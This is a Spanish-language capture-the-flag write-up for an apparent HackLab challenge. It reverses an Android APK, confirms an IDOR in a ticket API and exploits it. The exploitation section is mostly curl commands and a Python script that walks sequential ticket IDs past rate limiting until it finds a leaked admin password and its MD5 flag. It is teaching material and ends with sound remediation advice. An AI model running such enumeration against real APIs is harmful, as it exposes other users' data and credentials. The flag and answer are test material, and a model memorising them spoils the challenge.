# Soporte Confidencial — Writeup

**Plataforma:** HackLab (SoftwareSeguro)
**Edición:** HackingDay 2026
**Categoría:** IDOR - Reversing Apk
**Autor:** adonaissh

## Descripción del desafío

TechCorp usa una app móvil interna para gestionar tickets de soporte IT. Se
rumorea que el Administrador de Sistemas dejó anotada, por descuido, la
credencial de acceso al servidor de producción en algún lado del sistema.

- **Cuenta inicial:** `empleado` / `1234`
- **Objetivo:** obtener la contraseña del Administrador de Sistemas y
  entregar su hash MD5.

## Reconocimiento

Se descarga `soporte.apk` desde el portal del desafío. Un APK es un `.zip`
con bytecode Android (DEX) adentro.

### Manifest (apktool)

```bash
apktool d soporte.apk -o salida_apktool
cat salida_apktool/AndroidManifest.xml
```

Datos relevantes:
```xml
<application ... android:debuggable="true" android:usesCleartextTraffic="true">
    <activity android:exported="true" android:name="...LoginActivity">...</activity>
    <activity android:exported="false" android:name="...MainActivity"/>
```

Dos pantallas: login y listado principal. `usesCleartextTraffic="true"`
confirma que la app habla HTTP/HTTPS con un backend externo.

### Descompilación (jadx)

```bash
~/jadx/bin/jadx -d salida_jadx soporte.apk
find salida_jadx/sources -path "*soporteconfidencial*" -name "*.java"
```

Clases propias de la app: `LoginActivity`, `MainActivity`,
`MainActivity$fetchTickets$1`, `NetworkModule`, `ApiService`,
`LoginRequest`, `LoginResponse`, `Ticket`.

**`ApiService.java`** (interfaz Retrofit) expone el contrato completo de la
API en pocas líneas:
```java
public interface ApiService {
    @GET("/api/v1/tickets/{id}")
    Call<Ticket> getTicketDetails(@Path("id") int id);

    @GET("/api/v1/tickets")
    Call<List<Ticket>> getTickets();

    @POST("/api/v1/login")
    Call<LoginResponse> login(@Body LoginRequest request);
}
```

**`NetworkModule.java`** revela el host del backend y cómo se autentica:
```java
private static final String BASE_URL = "https://sop-conf.shared.softwareseguro.com.ar";
...
requestBuilder.addHeader("Authorization", "Bearer " + authToken);
```

**`LoginRequest`/`LoginResponse`** definen el contrato del login:
`{"username","password"}` → `{"token","user_id"}` (el token es un JWT).

`MainActivity.java` no agrega nada relevante: solo lista tickets propios y
muestra el detalle del que se clickee, sin lógica especial ni IDs
hardcodeados.

## Análisis

El endpoint `GET /api/v1/tickets/{id}` recibe un **entero simple** como
identificador de ticket, sin ningún token no adivinable (UUID, hash, etc.)
de por medio — candidato directo a **IDOR** (CWE-639) si el backend no
valida que el ticket solicitado pertenezca al usuario autenticado.

## Explotación

### 1. Login como empleado

```bash
curl -s -X POST https://sop-conf.shared.softwareseguro.com.ar/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"empleado","password":"1234"}'
```
```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","user_id":10}
```

### 2. Confirmar los tickets propios

```bash
TOKEN="eyJ..."
curl -s https://sop-conf.shared.softwareseguro.com.ar/api/v1/tickets \
  -H "Authorization: Bearer $TOKEN"
```
```json
[{"id":101,"title":"Cambio de monitor","user_id":10},
 {"id":102,"title":"Teclado roto","user_id":10}]
```

Solo dos tickets propios (`user_id:10`), con IDs 101 y 102.

### 3. Confirmar el IDOR en el endpoint de detalle

```bash
curl -s https://sop-conf.shared.softwareseguro.com.ar/api/v1/tickets/1 \
  -H "Authorization: Bearer $TOKEN"
```
```json
{"id":1,"title":"Cambio de monitor","description":"...","user_id":11}
```

El endpoint devuelve sin problema un ticket con `user_id` distinto al
propio (11, no 10): **confirmado el IDOR**. Probando otros IDs al azar
(100, 103) se observa que existen tickets de otros usuarios en todo el
rango bajo, y que a partir de cierto punto el servidor responde
`{"error":"Ticket no encontrado"}`.

### 4. Enumeración del rango de IDs

Explorando manualmente se detecta un patrón: los tickets de relleno se
repiten en bloques cíclicos (mismos títulos y `user_id` cada ~12 IDs:
"Cambio de monitor", "Teclado roto", "Mouse no responde", etc.), y el
servidor aplica **rate limiting** (HTTP 429, `"Demasiadas solicitudes.
Intentá de nuevo en N segundos."`) tras unas pocas peticiones seguidas.

Se escribió un script en Python que recorre el rango de IDs, respeta el
rate limit reintentando tras la espera indicada, y resalta cualquier
ticket cuyo título/descripción contenga palabras clave relacionadas a
credenciales:

```python
import sys, time, requests

BASE = "https://sop-conf.shared.softwareseguro.com.ar/api/v1/tickets"

def main():
    token = sys.argv[1]
    inicio, fin = int(sys.argv[2]), int(sys.argv[3])
    headers = {"Authorization": f"Bearer {token}"}
    palabras_clave = ["contraseñ", "password", "credencial", "admin",
                       "produccion", "producción", "servidor"]

    for i in range(inicio, fin + 1):
        while True:
            r = requests.get(f"{BASE}/{i}", headers=headers, timeout=5)
            if r.status_code == 429:
                time.sleep(float(r.headers.get("Retry-After", 2)))
                continue
            if r.status_code != 200:
                break
            data = r.json()
            texto = (str(data.get("title","")) + " " + str(data.get("description",""))).lower()
            if any(k in texto for k in palabras_clave):
                print(f"\n*** CANDIDATO id={i} ***\n{data}")
            else:
                print(f"[id={i}] user_id={data.get('user_id')} title={data.get('title')!r}")
            break
        time.sleep(0.3)

if __name__ == "__main__":
    main()
```

Corrida en segundo plano (`nohup ... &`) para sortear el rate limiting sin
bloquear la terminal:
```bash
nohup python3 enumerar_tickets.py "$TOKEN" 1 150 > salida_tickets.log 2>&1 &
```

### Resultado

El ticket **id=59** rompe el patrón de relleno:

```bash
curl -s https://sop-conf.shared.softwareseguro.com.ar/api/v1/tickets/59 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```
```json
{
    "id": 59,
    "title": "Accesos Root Servidor",
    "description": "Por favor, no pierdas de nuevo la contraseña del servidor de producción. Es: S3cur3P@ssw0rd_2026!",
    "user_id": 1
}
```

`user_id: 1` corresponde al Administrador de Sistemas.

**Contraseña filtrada:** `S3cur3P@ssw0rd_2026!`

### Hash MD5

```bash
echo -n "S3cur3P@ssw0rd_2026!" | md5sum
```

**Flag:** `a93c74e82d58d44c254c431e0498c0ea`

## Causa raíz y remediación

- **Causa raíz:** el endpoint `GET /api/v1/tickets/{id}` identifica
  recursos con un entero secuencial predecible y no verifica que el
  `user_id` del ticket solicitado coincida con el usuario autenticado por
  el JWT recibido — **Insecure Direct Object Reference (CWE-639)**. El
  listado (`GET /api/v1/tickets`) sí filtra server-side correctamente por
  el usuario del token, pero el endpoint de detalle individual no replica
  ese control.

- **Remediación recomendada:**
  1. **Control de acceso a nivel de objeto en cada endpoint**, no solo en
     el de listado: antes de devolver un ticket por ID, verificar que su
     `user_id` coincida con el del token (o que el rol del usuario tenga
     permiso explícito para verlo).
  2. **No usar identificadores secuenciales predecibles** para recursos
     sensibles; preferir UUIDs, que además de dificultar la enumeración
     fuerzan a que cualquier chequeo de autorización faltante sea mucho
     más visible en pruebas.
  3. Mantener el **rate limiting** ya presente en la API (buena práctica
     existente) pero no depender de él como única defensa: ralentiza un
     ataque de enumeración, no lo impide.
  4. No almacenar credenciales en texto plano dentro de campos de texto
     libre (como la descripción de un ticket de soporte); usar un gestor
     de secretos o, como mínimo, canales de comunicación fuera del sistema
     que queda expuesto a otros usuarios.

## Herramientas usadas

- `apktool` (extracción de manifest y recursos del APK)
- `jadx` (descompilación a código Java/Kotlin legible)
- `curl` (interacción manual con la API REST)
- Python 3 + `requests` (script de enumeración con manejo de rate limit)
- `md5sum` (cálculo del hash final)